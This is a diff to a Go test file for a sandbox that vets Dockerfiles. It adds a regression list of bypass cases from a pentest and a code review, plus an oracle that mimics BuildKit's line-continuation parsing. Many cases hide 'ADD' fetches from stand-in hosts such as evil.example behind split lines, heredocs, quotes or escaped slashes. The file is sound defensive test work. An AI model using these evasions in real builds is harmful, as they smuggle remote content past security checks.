@@ -1,6 +1,7 @@
 package sandbox
 
 import (
+	"encoding/json"
 	"fmt"
 	"regexp"
 	"slices"
@@ -24,7 +25,6 @@ func TestCheckDockerfileAccepts(t *testing.T) {
 		"urls elsewhere":  {"FROM alpine:3\nLABEL org.opencontainers.image.source=https://example.com/x\nRUN echo https://example.com\n", []string{"alpine:3"}},
 		"tabs and crlf":   {"FROM\talpine:3\r\nRUN\ttrue\r\n", []string{"alpine:3"}},
 		"plain comments":  {"#!/usr/bin/env docker\n# Build the app.\nFROM alpine:3\n  # indented comment\n", []string{"alpine:3"}},
-		"heredoc":         {"FROM alpine:3\nRUN <<EOF\necho hi\nEOF\n", []string{"alpine:3"}},
 		"healthcheck":     {"FROM alpine:3\nHEALTHCHECK --interval=5s CMD true\n", []string{"alpine:3"}},
 		"boolean flags":   {"FROM alpine:3\nCOPY --link a /a\nCOPY --parents --LINK=false b /b\nADD --link c /c\n", []string{"alpine:3"}},
 		"mount types":     {"FROM alpine:3\nRUN --mount=type=tmpfs,target=/t --mount=type=bind,source=x,target=/x --mount=target=/y true\n", []string{"alpine:3"}},
@@ -104,7 +104,28 @@ var dockerfileBypasses = map[string]struct{ file, rule string }{
 	"flag as image":               {"FROM -x\n", ruleImageName},
 	"image with space":            {"FROM alpine 3\n", ruleImageName},
 	"no from":                     {"RUN true\n", ruleNoFrom},
-	"too many images":             {manyImages(maxBaseImages + 1), ruleTooManyImages},
+	// v0.2 release pentest F1-F3, each checked against BuildKit's parser.
+	"double backslash ends line": {"FROM busybox\nRUN x\\\\\nADD http://evil.example/a /a\n", ruleRemoteAdd},
+	"heredoc hash end word":      {"FROM busybox\nRUN <<#X\nx \\\n#X\nADD http://evil.example/a /a\n", ruleHeredoc},
+	"heredoc body stage":         {"FROM busybox\nRUN <<EOF\nFROM scratch AS attacker\nEOF\nCOPY --from=attacker / /x\n", ruleHeredoc},
+	"heredoc dash":               {"FROM busybox\nCOPY <<-EOF /x\nhi\nEOF\n", ruleHeredoc},
+	"heredoc fd":                 {"FROM busybox\nRUN 3<<EOF cat <&3\nhi\nEOF\n", ruleHeredoc},
+	"heredoc continued":          {"FROM busybox\nADD \\\n<<EOF /x\nhi\nEOF\n", ruleHeredoc},
+	"lone backslash continues":   {"FROM busybox\nADD \\\n\\\nhttps://example.com/x /x\n", ruleRemoteAdd},
+	// PR #307 review, each checked against BuildKit v0.23.2: it joins the
+	// pieces of a continued line with nothing between them, and its shell
+	// lexer drops quotes and escapes in every ADD source.
+	"url split over lines":     {"FROM busybox\nADD http:/\\\n/evil.example/x /d\n", ruleRemoteAdd},
+	"url split CRLF":           {"FROM busybox\r\nADD http:/\\\r\n/evil.example/x /d\r\n", ruleRemoteAdd},
+	"url split after flag":     {"FROM busybox\nADD --chmod=644 http:/\\\n/evil.example/x /d\n", ruleRemoteAdd},
+	"url split over comment":   {"FROM busybox\nADD http:/\\\n# c \\\n\n/evil.example/x /d\n", ruleRemoteAdd},
+	"keyword split":            {"FROM busybox\nAD\\\nD http://evil.example/x /d\n", ruleRemoteAdd},
+	"heredoc split":            {"FROM busybox\nRUN <\\\n<EOF cat\nhi\nEOF\n", ruleHeredoc},
+	"url escaped slashes":      {"FROM busybox\nADD http:\\/\\/evil.example/x /d\n", ruleRemoteAdd},
+	"url quoted part":          {"FROM busybox\nADD http:\"//\"evil.example/x /d\n", ruleRemoteAdd},
+	"url single quoted part":   {"FROM busybox\nADD http:'//'evil.example/x /d\n", ruleRemoteAdd},
+	"json url escaped slashes": {"FROM busybox\nADD [\"http:\\\\/\\\\/evil.example/x\", \"/d\"]\n", ruleRemoteAdd},
+	"too many images":          {manyImages(maxBaseImages + 1), ruleTooManyImages},
 }
 
 // TestDockerfileBypassesRefused is the protection test for the
@@ -160,10 +181,14 @@ var (
 	buildkitSpace = regexp.MustCompile(`[\t\v\f\r ]+`)
 	buildkitDirRe = regexp.MustCompile(`(?i)^[\t\v\f\r ]*(#|//)[\t\v\f\r ]*syntax[\t\v\f\r ]*=`)
 	buildkitNetRe = regexp.MustCompile(`(?i)^--(network|security|device)\b`)
+	// buildkitContRe is BuildKit v0.23.2's line continuation regex, copied
+	// verbatim; a match is replaced with its first group, nothing else.
+	buildkitContRe = regexp.MustCompile(`([^\\])\\[ \t]*$|^\\[ \t]*$`)
 )
 
-// oracleLines joins continued lines the way BuildKit's parser does: a
-// trailing "\" continues, comment and blank lines inside are dropped. It
+// oracleLines joins continued lines the way BuildKit's parser does: with
+// its own continuation regex and nothing between the pieces, comment and
+// blank lines inside dropped. It
 // splits on its own white-space class, so it sees \v, \f and \r.
 func oracleLines(text string) []string {
 	var out []string
@@ -176,11 +201,12 @@ func oracleLines(text string) []string {
 		if t == "" || strings.HasPrefix(t, "#") {
 			continue
 		}
-		if strings.HasSuffix(t, "\\") {
-			cur += strings.TrimSuffix(t, "\\") + " "
+		l = strings.TrimRight(l, "\r")
+		if buildkitContRe.MatchString(l) {
+			cur += buildkitContRe.ReplaceAllString(l, "$1")
 			continue
 		}
-		out = append(out, cur+t)
+		out = append(out, cur+l)
 		cur = ""
 	}
 	return append(out, cur)
@@ -207,6 +233,12 @@ func oracleProblems(data []byte, images, stages []string) []string {
 		if keyword == "FROM" && len(args) > 0 && !known(args[0]) {
 			problems = append(problems, "FROM image not checked: "+line)
 		}
+		if (keyword == "RUN" || keyword == "COPY" || keyword == "ADD") && strings.Contains(line, "<<") {
+			problems = append(problems, "heredoc: "+line)
+		}
+		if keyword == "ADD" && oracleRemoteAdd(args) {
+			problems = append(problems, "remote add: "+line)
+		}
 		if keyword == "ONBUILD" {
 			problems = append(problems, "onbuild trigger: "+line)
 		}
@@ -228,6 +260,27 @@ func oracleProblems(data []byte, images, stages []string) []string {
 		}
 	}
 	return problems
+}
+
+// oracleRemoteAdd reads the ADD sources as BuildKit's shell lexer leaves
+// them, quotes and escapes dropped, in the shell and the JSON form, and
+// reports a URL or a git remote.
+func oracleRemoteAdd(args []string) bool {
+	var srcs []string
+	if json.Unmarshal([]byte(strings.Join(args, " ")), &srcs) != nil {
+		srcs = args
+	}
+	if len(srcs) > 0 {
+		srcs = srcs[:len(srcs)-1] // the destination
+	}
+	unquote := strings.NewReplacer(`"`, "", "'", "", `\`, "")
+	for _, src := range srcs {
+		src = unquote.Replace(src)
+		if strings.Contains(src, "://") || strings.Contains(src, "@") && strings.Contains(src, ":") {
+			return true
+		}
+	}
+	return false
 }
 
 // oracleCacheMount is a --mount whose type BuildKit keeps or fills from
@@ -318,6 +371,13 @@ func TestOracleCatchesOldCheck(t *testing.T) {
 		"FROM alpine\nRUN --mount=type=bind,\"from=attacker.example/evil\",target=/m true\n",
 		"FROM alpine AS a\nONBUILD ADD https://attacker.example/x /x\nFROM a\n",
 		"FROM alpine\nRUN --mount=type=cache,target=/root/.npm true\n",
+		// accepted before the PR #307 review
+		"FROM alpine\nADD http:/\\\n/evil.example/x /d\n",
+		"FROM alpine\nAD\\\nD http://evil.example/x /d\n",
+		"FROM alpine\nADD http:\"//\"evil.example/x /d\n",
+		"FROM alpine\nADD [\"http:\\\\/\\\\/evil.example/x\", \"/d\"]\n",
+		"FROM alpine\nRUN <\\\n<EOF cat\nhi\nEOF\n",
+		"FROM alpine\nFROM attacker.example/ev\\\nil\n",
 	} {
 		if len(oracleProblems([]byte(file), []string{"alpine"}, nil)) == 0 {
 			t.Errorf("oracle missed %q", file)
